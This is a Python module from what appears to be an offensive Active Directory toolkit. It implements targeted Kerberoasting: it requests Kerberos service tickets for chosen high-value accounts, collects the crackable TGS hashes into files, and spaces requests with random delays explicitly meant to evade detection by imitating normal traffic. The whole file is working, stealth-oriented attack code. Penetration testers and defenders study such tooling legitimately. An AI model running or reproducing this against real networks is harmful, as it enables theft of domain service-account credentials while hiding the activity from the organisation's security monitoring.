"""
Targeted Kerberoast — Surgical single-user and prioritized roasting.

Instead of roasting every SPN (noisy), this targets specific
high-value accounts with random delays between requests.

OPSEC: Fewer TGS requests, spread over time, looks like
normal Kerberos traffic during business hours.
"""

import time
import random
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from ..utils.impacket_runner import ImpacketRunner
from ..utils.rubeus_commands import RubeusCommandGenerator


class TargetedKerberoast:
    """
    OPSEC-aware Kerberoasting that surgically targets individual
    high-value accounts rather than bulk-requesting all SPNs.
    """

    def __init__(
        self,
        domain: str,
        username: str,
        password: str = "",
        dc_ip: str = "",
        ntlm_hash: str = "",
    ):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.ntlm_hash = ntlm_hash

        self.runner = ImpacketRunner(domain, username, password, dc_ip, ntlm_hash)
        self.rubeus = RubeusCommandGenerator()

    def roast_single_user(
        self, target_user: str, output_file: Optional[str] = None
    ) -> str:
        """
        Request a TGS ticket for a single specific user.

        Returns the output file path on success, empty string on failure.
        """
        output_file = output_file or f"{target_user}_hash.txt"
        print(f"[*] Targeted Kerberoast: {target_user}")
        return self.runner.request_tgs(target_user, output_file)

    def roast_priority_targets(
        self,
        targets: List[str],
        delay_range: Tuple[float, float] = (2.0, 10.0),
    ) -> Dict[str, str]:
        """
        Roast prioritized targets with random delays between requests.

        Random delays make traffic patterns look like normal Kerberos
        activity instead of an automated tool spraying TGS requests.

        Returns a dict mapping target username → output file path.
        """
        print(f"\n{'=' * 60}")
        print("TARGETED KERBEROASTING — SURGICAL MODE")
        print(f"{'=' * 60}")
        print(f"[*] Targets: {len(targets)}")
        print(f"[*] Delay: {delay_range[0]}-{delay_range[1]}s between requests")

        results: Dict[str, str] = {}
        all_hashes: List[str] = []

        for i, target in enumerate(targets):
            print(f"\n[{i + 1}/{len(targets)}] ", end="")
            output_file = f"targeted_{target}_hash.txt"
            result = self.roast_single_user(target, output_file)

            if result:
                results[target] = output_file
                all_hashes.extend(self._read_hashes(output_file))

            # Random delay between requests (skip after last target)
            if i < len(targets) - 1:
                delay = random.uniform(*delay_range)
                print(f"    [*] Waiting {delay:.1f}s...")
                time.sleep(delay)

        self._print_summary(results, targets, all_hashes)
        return results

    def print_rubeus_commands(self, targets: List[str]):
        """Convenience wrapper to generate Rubeus commands."""
        self.rubeus.print_commands(targets)

    @staticmethod
    def _read_hashes(filepath: str) -> List[str]:
        """Read TGS hashes from a file, filtering for valid entries."""
        try:
            with open(filepath) as f:
                return [
                    line.strip()
                    for line in f
                    if line.strip() and "$krb5tgs$" in line
                ]
        except FileNotFoundError:
            return []

    @staticmethod
    def _print_summary(
        results: Dict[str, str], targets: List[str], all_hashes: List[str]
    ):
        """Print results and write combined hash file."""
        print(f"\n{'=' * 60}")
        print(f"[+] Roasted: {len(results)}/{len(targets)}")

        if all_hashes:
            combined = Path("targeted_hashes_combined.txt")
            combined.write_text("\n".join(all_hashes) + "\n")
            print(f"[+] Combined: {combined}")